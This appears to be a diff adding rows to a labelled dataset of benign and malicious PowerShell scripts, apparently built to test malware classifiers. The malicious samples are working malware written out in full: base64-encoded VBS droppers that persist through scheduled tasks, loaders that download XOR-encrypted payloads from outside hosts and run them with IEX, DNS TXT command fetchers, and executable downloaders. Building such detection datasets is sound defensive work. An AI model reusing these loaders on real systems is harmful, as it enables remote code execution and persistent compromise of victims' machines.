+{
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
+        [AllowNull()]
+        [AllowEmptyString()]
+        [string[]]
+        
+        $Value,
+        
+        [Text.Encoding]
+        
+        $Encoding = ([Text.Encoding]::Unicode)
+    )
+    
+    begin
+    {
+        Set-StrictMode -Version 'Latest'
+
+        Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState
+    }
+
+    process
+    {
+        $Value | ForEach-Object {
+            if( $_ -eq $null )
+            {
+                return $null
+            }
+            
+            $bytes = [Convert]::FromBase64String($_)
+            $Encoding.GetString($bytes)
+        }
+    }
+}",48,benign,FromBase64String,True,benign,-3.4375
+1298.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String,3,True,1084,1084,False,"$path= ""$env:userprofile\appdata\local\microsoft\Windows""
+
+if(-not(Test-Path -Path($path)))
+{mkdir $path}
+
+$fileout=""$path\L69742.vbs"";
+
+$encstrvbs=""c2V0IHdzcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpzdHIgPSAicG93ZXIiICYgInNoIiAmICJlbGwiICYgIi5lIiAmICJ4ZSAtTm9QIC1zdGEgLU5vbkkgLWUiICYgInhlIiAmICJjIGJ5cCIgJiAiYXMiICYgInMgLWZpIiAmICJsZSAiDQpwYXRoID0gIiNkcGF0aCMiDQpzdHIgPSBzdHIgKyBwYXRoICsgIlxtYy5wczEiDQp3c3MuUnVuIHN0ciwgMCANCg0K"";
+
+$bytevbs=[System.Convert]::FromBase64String($encstrvbs);
+
+$strvbs=[System.Text.Encoding]::ASCII.GetString($bytevbs);
+
+$strvbs = $strvbs.replace('
+
+set-content $fileout $strvbs;
+
+$tmpfile=""$env:TEMP\U1848931.TMP"";
+
+
+
+$pscode_b64  =get-content $tmpfile | out-string;
+
+$pscode_b64=$pscode_b64.trim();
+
+
+$pscode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pscode_b64))
+
+$id = [string](get-random -min 10000 -max 100000)
+
+$pscode = $pscode.replace('
+
+set-content ""$path\mc.ps1"" $pscode
+
+
+$taskstr=""schtasks /create /F /sc minute /mo 2 /tn """"GoogleServiceUpdate"""" /tr """"\""""$fileout""""\""""   "";
+
+
+
+iex 'cmd /c $taskstr';",48,malicious,FromBase64String,True,malicious,3.578125
+1444.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,740,740,False,"function ConvertFrom-CBase64
+{
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
+        [AllowNull()]
+        [AllowEmptyString()]
+        [string[]]
+        
+        $Value,
+        
+        [Text.Encoding]
+        
+        $Encoding = ([Text.Encoding]::Unicode)
+    )
+    
+    begin
+    {
+        Set-StrictMode -Version 'Latest'
+
+        Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState
+    }
+
+    process
+    {
+        $Value | ForEach-Object {
+            if( $_ -eq $null )
+            {
+                return $null
+            }
+            
+            $bytes = [Convert]::FromBase64String($_)
+            $Encoding.GetString($bytes)
+        }
+    }
+}",49,benign,FromBase64String,True,benign,-3.4375
+2546.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String,3,True,1084,1084,False,"$path= ""$env:userprofile\appdata\local\microsoft\Windows""
+
+if(-not(Test-Path -Path($path)))
+{mkdir $path}
+
+$fileout=""$path\L69742.vbs"";
+
+$encstrvbs=""c2V0IHdzcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpzdHIgPSAicG93ZXIiICYgInNoIiAmICJlbGwiICYgIi5lIiAmICJ4ZSAtTm9QIC1zdGEgLU5vbkkgLWUiICYgInhlIiAmICJjIGJ5cCIgJiAiYXMiICYgInMgLWZpIiAmICJsZSAiDQpwYXRoID0gIiNkcGF0aCMiDQpzdHIgPSBzdHIgKyBwYXRoICsgIlxtYy5wczEiDQp3c3MuUnVuIHN0ciwgMCANCg0K"";
+
+$bytevbs=[System.Convert]::FromBase64String($encstrvbs);
+
+$strvbs=[System.Text.Encoding]::ASCII.GetString($bytevbs);
+
+$strvbs = $strvbs.replace('
+
+set-content $fileout $strvbs;
+
+$tmpfile=""$env:TEMP\U1848931.TMP"";
+
+
+
+$pscode_b64  =get-content $tmpfile | out-string;
+
+$pscode_b64=$pscode_b64.trim();
+
+
+$pscode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pscode_b64))
+
+$id = [string](get-random -min 10000 -max 100000)
+
+$pscode = $pscode.replace('
+
+set-content ""$path\mc.ps1"" $pscode
+
+
+$taskstr=""schtasks /create /F /sc minute /mo 2 /tn """"GoogleServiceUpdate"""" /tr """"\""""$fileout""""\""""   "";
+
+
+
+iex 'cmd /c $taskstr';",49,malicious,FromBase64String,True,malicious,3.578125
+1444.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,740,740,False,"function ConvertFrom-CBase64
+{
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
+        [AllowNull()]
+        [AllowEmptyString()]
+        [string[]]
+        
+        $Value,
+        
+        [Text.Encoding]
+        
+        $Encoding = ([Text.Encoding]::Unicode)
+    )
+    
+    begin
+    {
+        Set-StrictMode -Version 'Latest'
+
+        Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState
+    }
+
+    process
+    {
+        $Value | ForEach-Object {
+            if( $_ -eq $null )
+            {
+                return $null
+            }
+            
+            $bytes = [Convert]::FromBase64String($_)
+            $Encoding.GetString($bytes)
+        }
+    }
+}",50,benign,FromBase64String,True,benign,-3.4375
+905.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String,3,True,1084,1084,False,"$path= ""$env:userprofile\appdata\local\microsoft\Windows""
+
+if(-not(Test-Path -Path($path)))
+{mkdir $path}
+
+$fileout=""$path\L69742.vbs"";
+
+$encstrvbs=""c2V0IHdzcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpzdHIgPSAicG93ZXIiICYgInNoIiAmICJlbGwiICYgIi5lIiAmICJ4ZSAtTm9QIC1zdGEgLU5vbkkgLWUiICYgInhlIiAmICJjIGJ5cCIgJiAiYXMiICYgInMgLWZpIiAmICJsZSAiDQpwYXRoID0gIiNkcGF0aCMiDQpzdHIgPSBzdHIgKyBwYXRoICsgIlxtYy5wczEiDQp3c3MuUnVuIHN0ciwgMCANCg0K"";
+
+$bytevbs=[System.Convert]::FromBase64String($encstrvbs);
+
+$strvbs=[System.Text.Encoding]::ASCII.GetString($bytevbs);
+
+$strvbs = $strvbs.replace('
+
+set-content $fileout $strvbs;
+
+$tmpfile=""$env:TEMP\U1848931.TMP"";
+
+
+
+$pscode_b64  =get-content $tmpfile | out-string;
+
+$pscode_b64=$pscode_b64.trim();
+
+
+$pscode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pscode_b64))
+
+$id = [string](get-random -min 10000 -max 100000)
+
+$pscode = $pscode.replace('
+
+set-content ""$path\mc.ps1"" $pscode
+
+
+$taskstr=""schtasks /create /F /sc minute /mo 2 /tn """"GoogleServiceUpdate"""" /tr """"\""""$fileout""""\""""   "";
+
+
+
+iex 'cmd /c $taskstr';",50,malicious,FromBase64String,True,malicious,3.59375
+1670.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,498,498,False,"function ConvertTo-Bytes {
+    param (
+        [string]$file
+    )
+
+    if (!$file -or !(Test-Path $file)) {
+        throw ""file not found: '$file'""
+    }
+
+    [convert]::ToBase64String((Get-Content $file -Encoding Byte))
+}
+
+function ConvertFrom-Bytes {
+    param (
+        [string]$bytes,
+        [string]$savepath
+    )
+
+    $dir = Split-Path $savepath
+    if (!(Test-Path $dir)) {
+        md $dir | Out-Null
+    }
+
+    [convert]::FromBase64String($bytes) | Set-Content $savepath -Encoding Byte
+}",51,benign,FromBase64String,True,benign,-4.765625
+2139.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String|DownloadString|Net.WebClient,4,True,857,857,False,"$sha1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider; $vc=$env:computername; $vu=$env:username; $vh=[system.convert]::tobase64string($sha1.ComputeHash([system.text.encoding]::utf8.getbytes($vc+$vu+$(gwmi win32_bios)))); $vs=[system.convert]::tobase64string([system.text.encoding]::utf8.getbytes($vc+'|'+$vu+'|'+'903f2f8cf535578b8c63dfcf5f1d3f549e489101')); $u='http://vanity-fair.org/news/rss.php?q='+$vs; $ps=(New-Object Net.WebClient).DownloadString($u); $ps=[Convert]::FromBase64String($ps); $n=$ps[0]; $k=$ps[1..$n]; $d=$ps[($n+1)..$ps.count]; for ($i=0; $i -lt $d.count -and $i -lt 1024; $i++){ $d[$i] = $d[$i] -bxor $k[$i % $n]; }; iex $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$d)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()",51,malicious,FromBase64String,True,malicious,8.0390625
+1670.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,498,498,False,"function ConvertTo-Bytes {
+    param (
+        [string]$file
+    )
+
+    if (!$file -or !(Test-Path $file)) {
+        throw ""file not found: '$file'""
+    }
+
+    [convert]::ToBase64String((Get-Content $file -Encoding Byte))
+}
+
+function ConvertFrom-Bytes {
+    param (
+        [string]$bytes,
+        [string]$savepath
+    )
+
+    $dir = Split-Path $savepath
+    if (!(Test-Path $dir)) {
+        md $dir | Out-Null
+    }
+
+    [convert]::FromBase64String($bytes) | Set-Content $savepath -Encoding Byte
+}",52,benign,FromBase64String,True,benign,-4.765625
+2792.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String|DownloadString|Net.WebClient,8,True,882,882,False,"$uuid=(get-wmiobject win32_computersystemproduct).UUID;$wc=New-Object System.Net.WebClient;
+$u='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.363 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.363';
+$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, ""u=$uuid; c=x3c93dlfcu53"");
+$wc.Headers.Add('user-agent',$u);$reg=$wc.downloadstring(""https://www.appstats.pw/index.php"");
+$wc.Headers.Remove([System.Net.HttpRequestHeader]::Cookie);
+$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, ""u=$uuid"");
+$wc.headers.add('user-agent',$u);IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring(""https://www.appstats.pw/3del.php""))));
+while($true){
+	try{
+		$wc.headers.add('user-agent',$u);
+		IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring(""https://www.appstats.pw/index.php""))));
+	}
+	catch{
+		sleep 180;
+	}
+}",52,malicious,FromBase64String,True,malicious,5.078125
+1637.ps1,benign,natural_overlap,IEX,IEX,1,True,886,886,False,"function Get-BootConfigurationData {
+    param (
+        $bcdeditpath = (Join-Path $env:SystemRoot 'system32\bcdedit.exe')
+    )
+
+    $bootconfigurationdata = iex $bcdeditpath
+    $bootconfigurationdata += ''
+
+    $hash = $null
+    $result = foreach ($line in $bootconfigurationdata) {
+        if ($line -eq '') {
+            if ($hash) {
+                [pscustomobject]$hash
+            }
+            $hash = @{}
+            continue
+        }
+        if ($line.startswith('-----')) { continue }
+        if ($line.startswith('Windows Boot')) {
+            $hash.Add('Type', $line)
+        } else {
+            $name = $line.Substring(0, $line.IndexOf(' '))
+            $value = $line.Substring($line.IndexOf(' ')).trim()
+            $hash.Add($name, $value)
+        }
+    }
+
+    $props = $result | % {gm -in $_ -ty *property} | % name | select -u | sort
+
+    $result | select $props
+}",53,benign,IEX,True,benign,-2.171875
+2752.ps1,malicious,natural_overlap,IEX,IEX,1,True,82,82,False,if(''+(nslookup -q=txt p.s.w2.ns.rankingplac.pl) -match '@(.*)@'){iex $matches[1]},53,malicious,IEX,True,malicious,0.6875
+1637.ps1,benign,natural_overlap,IEX,IEX,1,True,886,886,False,"function Get-BootConfigurationData {
+    param (
+        $bcdeditpath = (Join-Path $env:SystemRoot 'system32\bcdedit.exe')
+    )
+
+    $bootconfigurationdata = iex $bcdeditpath
+    $bootconfigurationdata += ''
+
+    $hash = $null
+    $result = foreach ($line in $bootconfigurationdata) {
+        if ($line -eq '') {
+            if ($hash) {
+                [pscustomobject]$hash
+            }
+            $hash = @{}
+            continue
+        }
+        if ($line.startswith('-----')) { continue }
+        if ($line.startswith('Windows Boot')) {
+            $hash.Add('Type', $line)
+        } else {
+            $name = $line.Substring(0, $line.IndexOf(' '))
+            $value = $line.Substring($line.IndexOf(' ')).trim()
+            $hash.Add($name, $value)
+        }
+    }
+
+    $props = $result | % {gm -in $_ -ty *property} | % name | select -u | sort
+
+    $result | select $props
+}",54,benign,IEX,True,benign,-2.171875
+2115.ps1,malicious,natural_overlap,IEX,IEX,1,True,78,78,False,if(''+(nslookup -q=txt p.s.pn.ns.sse.net.pl) -match '@(.*)@'){iex $matches[1]},54,malicious,IEX,True,malicious,0.625
+1637.ps1,benign,natural_overlap,IEX,IEX,1,True,886,886,False,"function Get-BootConfigurationData {
+    param (
+        $bcdeditpath = (Join-Path $env:SystemRoot 'system32\bcdedit.exe')
+    )
+
+    $bootconfigurationdata = iex $bcdeditpath
+    $bootconfigurationdata += ''
+
+    $hash = $null
+    $result = foreach ($line in $bootconfigurationdata) {
+        if ($line -eq '') {
+            if ($hash) {
+                [pscustomobject]$hash
+            }
+            $hash = @{}
+            continue
+        }
+        if ($line.startswith('-----')) { continue }
+        if ($line.startswith('Windows Boot')) {
+            $hash.Add('Type', $line)
+        } else {
+            $name = $line.Substring(0, $line.IndexOf(' '))
+            $value = $line.Substring($line.IndexOf(' ')).trim()
+            $hash.Add($name, $value)
+        }
+    }
+
+    $props = $result | % {gm -in $_ -ty *property} | % name | select -u | sort
+
+    $result | select $props
+}",56,benign,IEX,True,benign,-2.171875
+784.ps1,malicious,natural_overlap,IEX,IEX,1,True,73,73,False,"if(""""+(nslookup -q=txt l.ns.huawel.ro.) -match ""@(.*)@""){iex $matches[1]}",56,malicious,IEX,True,malicious,0.375
+1634.ps1,benign,natural_overlap,IEX,IEX,1,True,1434,1434,False,"function Get-ComputerShares {
+    param (
+        [string]$comp = $env:COMPUTERNAME
+    )
+    
+    if (!$comp) { throw 'No comps.' }
+
+    $ping = New-Object System.Net.NetworkInformation.Ping
+    try {
+        $result = $ping.Send($comp)
+    } catch {
+        $result = $null
+    }
+
+    $sharename = $type = $comment = $ip = '-'
+    if ($result.Status -eq 'Success') {
+        
+        $ip = $result.Address.ToString()
+
+        
+        $netview = iex ""cmd /c net view $comp 2>&1"" | ? {$_}
+
+        
+        if ($netview.count -lt 5) {
+            [pscustomobject]@{
+                Computer = $comp
+                IP = $ip
+                ShareName = $sharename
+                Type = $type
+                Comment = $comment
+            }
+            return
+        }
+
+        $netview = $netview | ? {$_  -match '\s{2}'} | select -Skip 1
+
+        foreach ($line in $netview) {
+            $line = $line -split '\s{2,}'
+
+            $sharename = $line[0]
+            $type = $line[1]
+            $comment = $line[2]
+
+            [pscustomobject]@{
+                Computer = $comp
+                IP = $ip
+                ShareName = $sharename
+                Type = $type
+                Comment = $comment
+            }
+        }
+    } else {
+        [pscustomobject]@{
+            Computer = $comp
+            IP = $ip
+            ShareName = $sharename
+            Type = $type
+            Comment = $comment
+        }
+    }
+}",57,benign,IEX,True,benign,-3.34375
+2752.ps1,malicious,natural_overlap,IEX,IEX,1,True,82,82,False,if(''+(nslookup -q=txt p.s.w2.ns.rankingplac.pl) -match '@(.*)@'){iex $matches[1]},57,malicious,IEX,True,malicious,0.6875
+1634.ps1,benign,natural_overlap,IEX,IEX,1,True,1434,1434,False,"function Get-ComputerShares {
+    param (
+        [string]$comp = $env:COMPUTERNAME
+    )
+    
+    if (!$comp) { throw 'No comps.' }
+
+    $ping = New-Object System.Net.NetworkInformation.Ping
+    try {
+        $result = $ping.Send($comp)
+    } catch {
+        $result = $null
+    }
+
+    $sharename = $type = $comment = $ip = '-'
+    if ($result.Status -eq 'Success') {
+        
+        $ip = $result.Address.ToString()
+
+        
+        $netview = iex ""cmd /c net view $comp 2>&1"" | ? {$_}
+
+        
+        if ($netview.count -lt 5) {
+            [pscustomobject]@{
+                Computer = $comp
+                IP = $ip
+                ShareName = $sharename
+                Type = $type
+                Comment = $comment
+            }
+            return
+        }
+
+        $netview = $netview | ? {$_  -match '\s{2}'} | select -Skip 1
+
+        foreach ($line in $netview) {
+            $line = $line -split '\s{2,}'
+
+            $sharename = $line[0]
+            $type = $line[1]
+            $comment = $line[2]
+
+            [pscustomobject]@{
+                Computer = $comp
+                IP = $ip
+                ShareName = $sharename
+                Type = $type
+                Comment = $comment
+            }
+        }
+    } else {
+        [pscustomobject]@{
+            Computer = $comp
+            IP = $ip
+            ShareName = $sharename
+            Type = $type
+            Comment = $comment
+        }
+    }
+}",58,benign,IEX,True,benign,-3.34375
+2115.ps1,malicious,natural_overlap,IEX,IEX,1,True,78,78,False,if(''+(nslookup -q=txt p.s.pn.ns.sse.net.pl) -match '@(.*)@'){iex $matches[1]},58,malicious,IEX,True,malicious,0.625
+1634.ps1,benign,natural_overlap,IEX,IEX,1,True,1434,1434,False,"function Get-ComputerShares {
+    param (
+        [string]$comp = $env:COMPUTERNAME
+    )
+    
+    if (!$comp) { throw 'No comps.' }
+
+    $ping = New-Object System.Net.NetworkInformation.Ping
+    try {
+        $result = $ping.Send($comp)
+    } catch {
+        $result = $null
+    }
+
+    $sharename = $type = $comment = $ip = '-'
+    if ($result.Status -eq 'Success') {
+        
+        $ip = $result.Address.ToString()
+
+        
+        $netview = iex ""cmd /c net view $comp 2>&1"" | ? {$_}
+
+        
+        if ($netview.count -lt 5) {
+            [pscustomobject]@{
+                Computer = $comp
+                IP = $ip
+                ShareName = $sharename
+                Type = $type
+                Comment = $comment
+            }
+            return
+        }
+
+        $netview = $netview | ? {$_  -match '\s{2}'} | select -Skip 1
+
+        foreach ($line in $netview) {
+            $line = $line -split '\s{2,}'
+
+            $sharename = $line[0]
+            $type = $line[1]
+            $comment = $line[2]
+
+            [pscustomobject]@{
+                Computer = $comp
+                IP = $ip
+                ShareName = $sharename
+                Type = $type
+                Comment = $comment
+            }
+        }
+    } else {
+        [pscustomobject]@{
+            Computer = $comp
+            IP = $ip
+            ShareName = $sharename
+            Type = $type
+            Comment = $comment
+        }
+    }
+}",60,benign,IEX,True,benign,-3.34375
+784.ps1,malicious,natural_overlap,IEX,IEX,1,True,73,73,False,"if(""""+(nslookup -q=txt l.ns.huawel.ro.) -match ""@(.*)@""){iex $matches[1]}",60,malicious,IEX,True,malicious,0.375
+3784.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,592,592,False,"$aliaspage = Invoke-WebRequest -Uri ""https://raw.githubusercontent.com/Azure/azure-rest-api-specs/master/arm-compute/quickstart-templates/aliases.json"" -TimeoutSec 5
+$parsedJson = $aliaspage.Content | ConvertFrom-Json
+
+$win10Image = @""
+{
+    ""publisher"": ""MicrosoftVisualStudio"",
+    ""offer"": ""Windows"",
+    ""sku"": ""Windows-10-N-x64"",
+    ""version"": ""latest""
+}
+""@
+
+$parsedJson.Outputs.Aliases.Value.Windows | Add-Member -Name ""Win10"" -Value (ConvertFrom-Json $win10Image) -MemberType NoteProperty
+
+ConvertTo-Json $parsedJson.Outputs.Aliases.Value | Set-Content -Path $PSScriptRoot/Images.json",81,benign,Invoke-WebRequest,True,benign,-3.3125
+3834.ps1,malicious,natural_overlap,Invoke-WebRequest,IEX|DownloadString|Invoke-WebRequest|Net.WebClient,5,True,552,552,False,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;Invoke-WebRequest -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};IEX ($B-jOin'');",81,malicious,Invoke-WebRequest,True,malicious,10.546875
+4058.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,654,654,False,"param(
+    [string]$buildCorePowershellUrl = ""https://opbuildstorageprod.blob.core.windows.net/opps1container/.openpublishing.buildcore.ps1"",
+    [string]$parameters
+)
+
+$errorActionPreference = 'Stop'
+
+
+echo ""download build core script to local with source url: $buildCorePowershellUrl""
+$repositoryRoot = Split-Path -Parent $MyInvocation.MyCommand.Definition
+$buildCorePowershellDestination = ""$repositoryRoot\.openpublishing.buildcore.ps1""
+Invoke-WebRequest $buildCorePowershellUrl -OutFile ""$buildCorePowershellDestination""
+
+
+echo ""run build core script with parameters: $parameters""
+& ""$buildCorePowershellDestination"" ""$parameters""
+exit $LASTEXITCODE",82,benign,Invoke-WebRequest,True,benign,-3.140625
+3834.ps1,malicious,natural_overlap,Invoke-WebRequest,IEX|DownloadString|Invoke-WebRequest|Net.WebClient,5,True,552,552,False,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;Invoke-WebRequest -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};IEX ($B-jOin'');",82,malicious,Invoke-WebRequest,True,malicious,10.546875
+3104.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-Expression|Invoke-WebRequest,2,True,706,706,False,"param(
+    [string]$buildCorePowershellUrl = ""https://opbuildstorageprod.blob.core.windows.net/opps1container/.openpublishing.buildcore.ps1"",
+    [string]$parameters
+)
+
+$errorActionPreference = 'Stop'
+
+
+echo ""download build core script to local with source url: $buildCorePowershellUrl""
+$repositoryRoot = Split-Path -Parent $MyInvocation.MyCommand.Definition
+$buildCorePowershellDestination = ""$repositoryRoot\.openpublishing.buildcore.ps1""
+Invoke-WebRequest $buildCorePowershellUrl -OutFile $buildCorePowershellDestination
+
+
+echo ""run build core script with parameters: $parameters""
+$arguments = ""-parameters:'$parameters'""
+Invoke-Expression ""$buildCorePowershellDestination $arguments""
+exit $LASTEXITCODE",83,benign,Invoke-WebRequest,True,benign,-2.578125
+3834.ps1,malicious,natural_overlap,Invoke-WebRequest,IEX|DownloadString|Invoke-WebRequest|Net.WebClient,5,True,552,552,False,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;Invoke-WebRequest -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};IEX ($B-jOin'');",83,malicious,Invoke-WebRequest,True,malicious,10.546875
+896.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,839,839,False,"$Random=(New-Guid).ToString().Substring(0,8)
+
+
+$ResourceGroupName=""myResourceGroup$Random""
+$AppName=""AppServiceMonitor$Random""
+$Location=""WestUS""
+
+
+New-AzResourceGroup -Name $ResourceGroupName -Location $Location
+
+
+New-AzAppservicePlan -Name AppServiceMonitorPlan -ResourceGroupName $ResourceGroupName -Location $Location -Tier Basic
+
+
+New-AzWebApp -Name $AppName -ResourceGroupName $ResourceGroupName -Location $Location -AppServicePlan AppServiceMonitorPlan
+
+
+Set-AzWebApp -RequestTracingEnabled $True -HttpLoggingEnabled $True -DetailedErrorLoggingEnabled $True -ResourceGroupName $ResourceGroupName -Name $AppName
+
+
+Invoke-WebRequest -Method ""Get"" -Uri https://$AppName.azurewebsites.net/404 -ErrorAction SilentlyContinue
+
+
+Write-Host ""In your browser, download the logs for your app at https://$AppName.scm.azurewebsites.net/api/dump""",84,benign,Invoke-WebRequest,True,benign,-3.25
+3834.ps1,malicious,natural_overlap,Invoke-WebRequest,IEX|DownloadString|Invoke-WebRequest|Net.WebClient,5,True,552,552,False,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;Invoke-WebRequest -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};IEX ($B-jOin'');",84,malicious,Invoke-WebRequest,True,malicious,10.546875
+3784.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,592,592,False,"$aliaspage = Invoke-WebRequest -Uri ""https://raw.githubusercontent.com/Azure/azure-rest-api-specs/master/arm-compute/quickstart-templates/aliases.json"" -TimeoutSec 5
+$parsedJson = $aliaspage.Content | ConvertFrom-Json
+
+$win10Image = @""
+{
+    ""publisher"": ""MicrosoftVisualStudio"",
+    ""offer"": ""Windows"",
+    ""sku"": ""Windows-10-N-x64"",
+    ""version"": ""latest""
+}
+""@
+
+$parsedJson.Outputs.Aliases.Value.Windows | Add-Member -Name ""Win10"" -Value (ConvertFrom-Json $win10Image) -MemberType NoteProperty
+
+ConvertTo-Json $parsedJson.Outputs.Aliases.Value | Set-Content -Path $PSScriptRoot/Images.json",86,benign,Invoke-WebRequest,True,benign,-3.3125
+1362.ps1,malicious,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,80,80,False,Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,86,malicious,Invoke-WebRequest,True,malicious,0.15625
+4058.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,654,654,False,"param(
+    [string]$buildCorePowershellUrl = ""https://opbuildstorageprod.blob.core.windows.net/opps1container/.openpublishing.buildcore.ps1"",
+    [string]$parameters
+)
+
+$errorActionPreference = 'Stop'
+
+
+echo ""download build core script to local with source url: $buildCorePowershellUrl""
+$repositoryRoot = Split-Path -Parent $MyInvocation.MyCommand.Definition
+$buildCorePowershellDestination = ""$repositoryRoot\.openpublishing.buildcore.ps1""
+Invoke-WebRequest $buildCorePowershellUrl -OutFile ""$buildCorePowershellDestination""
+
+
+echo ""run build core script with parameters: $parameters""
+& ""$buildCorePowershellDestination"" ""$parameters""
+exit $LASTEXITCODE",87,benign,Invoke-WebRequest,True,benign,-3.140625
+1362.ps1,malicious,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,80,80,False,Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,87,malicious,Invoke-WebRequest,True,malicious,0.15625
+3104.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-Expression|Invoke-WebRequest,2,True,706,706,False,"param(
+    [string]$buildCorePowershellUrl = ""https://opbuildstorageprod.blob.core.windows.net/opps1container/.openpublishing.buildcore.ps1"",
+    [string]$parameters
+)
+
+$errorActionPreference = 'Stop'
+
+
+echo ""download build core script to local with source url: $buildCorePowershellUrl""
+$repositoryRoot = Split-Path -Parent $MyInvocation.MyCommand.Definition
+$buildCorePowershellDestination = ""$repositoryRoot\.openpublishing.buildcore.ps1""
+Invoke-WebRequest $buildCorePowershellUrl -OutFile $buildCorePowershellDestination
+
+
+echo ""run build core script with parameters: $parameters""
+$arguments = ""-parameters:'$parameters'""
+Invoke-Expression ""$buildCorePowershellDestination $arguments""
+exit $LASTEXITCODE",88,benign,Invoke-WebRequest,True,benign,-2.578125
+1362.ps1,malicious,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,80,80,False,Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,88,malicious,Invoke-WebRequest,True,malicious,0.15625
